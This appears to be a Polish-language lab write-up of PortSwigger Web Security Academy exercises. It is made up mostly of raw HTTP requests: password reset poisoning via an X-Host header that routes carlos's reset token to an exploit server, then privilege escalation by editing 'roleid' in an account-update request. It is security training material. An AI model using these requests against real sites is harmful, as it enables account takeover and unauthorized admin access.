@@ -1,0 +1,229 @@
+I
+
+A1: Cel zdobycie carlosa
+"Host header authentication bypass" lub "Host header poisoning via password reset", ""Password Reset Poisoning via Host Header"
+Endpoint /new-password z username=carlos to żądanie wysłania linku resetującego — x-host ma skłonić appkę do zbudowania linku resetującego na Twojej domenie exploit-server.
+Kontekst: nie mam dostepu do konta wiener, nie jestem zalgowana i mam zdobyć cookies carlosa.
+
+POST /log-in HTTP/2
+Host: 0af7004b03469209810f4e5200da0049.web-security-academy.net
+X-Host: exploit-0a02007d033192c181864dfd017c00e7.exploit-server.net
+Cookie: session=av3vf33LUSPteC7IVGQCNsFYqbYO73Xx; _lab=46%7cMCwCFCOHp1e5%2bfnnFj5mcdEQyCq%2f3d2xAhQhFwP7eXxQ2f5SBD5tb0lZ3XM0gPx9i7PluJihxqZ9wpPtiB8LSC0w7EMGdIDYLcLixNJGtbJFZ9GlyWr6mtxtZ6RfviSj5gLjf7sRAR9zUr%2ffaBtKEKpCSQ5utdI6e5y5GPOCT%2frgCAg%3d
+Content-Length: 66
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Origin: https://0af7004b03469209810f4e5200da0049.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0af7004b03469209810f4e5200da0049.web-security-academy.net/log-in
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=Xi17dTlfIz26S9Qhynifcdi23CxuuGNT&username=carlos&password=xxx
+
+
+>>200
+
+Musisz znaleźć endpoint, który inicjuje reset i wysyła e-mail z linkiem
+
+POST /new-password HTTP/2
+Host: 0af7004b03469209810f4e5200da0049.web-security-academy.net
+X-Host: exploit-0a02007d033192c181864dfd017c00e7.exploit-server.net
+Cookie: session=av3vf33LUSPteC7IVGQCNsFYqbYO73Xx; _lab=46%7cMCwCFCOHp1e5%2bfnnFj5mcdEQyCq%2f3d2xAhQhFwP7eXxQ2f5SBD5tb0lZ3XM0gPx9i7PluJihxqZ9wpPtiB8LSC0w7EMGdIDYLcLixNJGtbJFZ9GlyWr6mtxtZ6RfviSj5gLjf7sRAR9zUr%2ffaBtKEKpCSQ5utdI6e5y5GPOCT%2frgCAg%3d
+Content-Length: 53
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Origin: https://0af7004b03469209810f4e5200da0049.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0af7004b03469209810f4e5200da0049.web-security-academy.net/new-password
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=Xi17dTlfIz26S9Qhynifcdi23CxuuGNT&username=carlos
+
+
+>>200 Please check your email for a reset password link.
+
+
+ZDOBYCIE CARLOSA: token przyszedl na exploit logs
+Password reset poisoning daje token w access logu (ofiara klika link → GET z tokenem w URL → log). Wymaga: wstrzyknięcia hosta + ofiary klikającej. Bez skryptu.
+
+
+POST /new-password?temp-forgot-password-token=wuelp5um4qw4wi4l33g9xktwjdzmas9k HTTP/2
+Host: 0af7004b03469209810f4e5200da0049.web-security-academy.net
+Cookie: session=av3vf33LUSPteC7IVGQCNsFYqbYO73Xx; _lab=46%7cMCwCFCOHp1e5%2bfnnFj5mcdEQyCq%2f3d2xAhQhFwP7eXxQ2f5SBD5tb0lZ3XM0gPx9i7PluJihxqZ9wpPtiB8LSC0w7EMGdIDYLcLixNJGtbJFZ9GlyWr6mtxtZ6RfviSj5gLjf7sRAR9zUr%2ffaBtKEKpCSQ5utdI6e5y5GPOCT%2frgCAg%3d
+Content-Length: 53
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Origin: https://0af7004b03469209810f4e5200da0049.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: <meta name="referrer" content="no-referrer">
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=Xi17dTlfIz26S9Qhynifcdi23CxuuGNT&username=carlos
+
+
+A2: eskalacja na admina
+zmiana roleid na zasobie admina
+
+GET /myaccountdetails?id=carlos HTTP/2
+Host: 0af7004b03469209810f4e5200da0049.web-security-academy.net
+Cookie: _lab=46%7cMCwCFCOHp1e5%2bfnnFj5mcdEQyCq%2f3d2xAhQhFwP7eXxQ2f5SBD5tb0lZ3XM0gPx9i7PluJihxqZ9wpPtiB8LSC0w7EMGdIDYLcLixNJGtbJFZ9GlyWr6mtxtZ6RfviSj5gLjf7sRAR9zUr%2ffaBtKEKpCSQ5utdI6e5y5GPOCT%2frgCAg%3d; session=eiwPLWzuaTICQk6Wt0lh2RipDClVJpEX
+Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+
+
+
+POST /myaccountdetails/update_email HTTP/2
+Host: 0af7004b03469209810f4e5200da0049.web-security-academy.net
+Cookie: _lab=46%7cMCwCFCOHp1e5%2bfnnFj5mcdEQyCq%2f3d2xAhQhFwP7eXxQ2f5SBD5tb0lZ3XM0gPx9i7PluJihxqZ9wpPtiB8LSC0w7EMGdIDYLcLixNJGtbJFZ9GlyWr6mtxtZ6RfviSj5gLjf7sRAR9zUr%2ffaBtKEKpCSQ5utdI6e5y5GPOCT%2frgCAg%3d; session=ofMv62EALvT61WXW2zFGQfLFFLzKKQ8t
+Content-Length: 82
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Content-Type: text/plain;charset=UTF-8
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0af7004b03469209810f4e5200da0049.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0af7004b03469209810f4e5200da0049.web-security-academy.net/myaccountdetails?id=carlos
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+{"csrf":"qNXiL7lJGzDmIpTxsmZ0Yanjpsot4JJb","email":"carlos@carlos-montoya.net"
+ }
+
+
+HTTP/2 302 Found
+Location: /myaccountdetails
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 130
+
+{
+  "username": "carlos",
+  "email": "carlos@carlos-montoya.net",
+  "apikey": "1Uzf57mJHAOMR3bCHhb27k6gXAX8QbyL",
+  "roleid": 14
+}
+
+
+intruder
+<img width="1306" height="576" alt="image" src="https://github.com/user-attachments/assets/6c6554fc-d37c-4092-9485-659a2683dc32" />
+<img width="1293" height="576" alt="image" src="https://github.com/user-attachments/assets/25a60684-25c5-4d0b-9ca7-9847620ce0aa" />
+
+
+
+
+POST /admincontrols HTTP/2
+Host: 0af7004b03469209810f4e5200da0049.web-security-academy.net
+Cookie: _lab=46%7cMCwCFCOHp1e5%2bfnnFj5mcdEQyCq%2f3d2xAhQhFwP7eXxQ2f5SBD5tb0lZ3XM0gPx9i7PluJihxqZ9wpPtiB8LSC0w7EMGdIDYLcLixNJGtbJFZ9GlyWr6mtxtZ6RfviSj5gLjf7sRAR9zUr%2ffaBtKEKpCSQ5utdI6e5y5GPOCT%2frgCAg%3d; session=ofMv62EALvT61WXW2zFGQfLFFLzKKQ8t
+Content-Length: 126
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Content-Type: text/plain;charset=UTF-8
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0af7004b03469209810f4e5200da0049.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0af7004b03469209810f4e5200da0049.web-security-academy.net/myaccountdetails?id=carlos
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+{
+ "username": "administrator","csrf":"qNXiL7lJGzDmIpTxsmZ0Yanjpsot4JJb","email":"carlos@carlos-montoya.net","roleid": 59
+ }
+
+
+>> 200
+
+
+A3: Przeczytać /home/carlos/secret/
+
+
+II
+
+A: forgot passowrd, change email, skaner nic nie wykrywa, no hiddern params.
+
+POST /my-account-details HTTP/2
+Host: 0a0b0036034d6688801803a000ed009d.web-security-academy.net
+Cookie: session=J7UP9Aq5sDWuRtxzFr46HUprjBL16Bgp; _lab=46%7cMCwCFHc%2bIcED2Devkwv8bvMBV2KH5HcoAhQWZR%2fueyaslHS9FR%2b7h7jcibL6EW78jVOZJTWCH7bvHjLGk1Uvz%2bc8ajOSjOA%2bd%2bl4TMPm1Hsn%2b%2f7pwKzGoCxCLVe9MGubBPFVLvx4JX0jXh0TVi78K4%2bqMePXbyP3oUEkMx%2b8RyRkvUI%3d
+Content-Length: 53
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Origin: https://0a0b0036034d6688801803a000ed009d.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a0b0036034d6688801803a000ed009d.web-security-academy.net/forgot-password
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=BHLO66SdGxYt4D6h4d3z9cyn8Zfn31Xb&username=carlos
+
+
+
+HTTP/2 302 Found
+Location: /hello
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+
+
+  
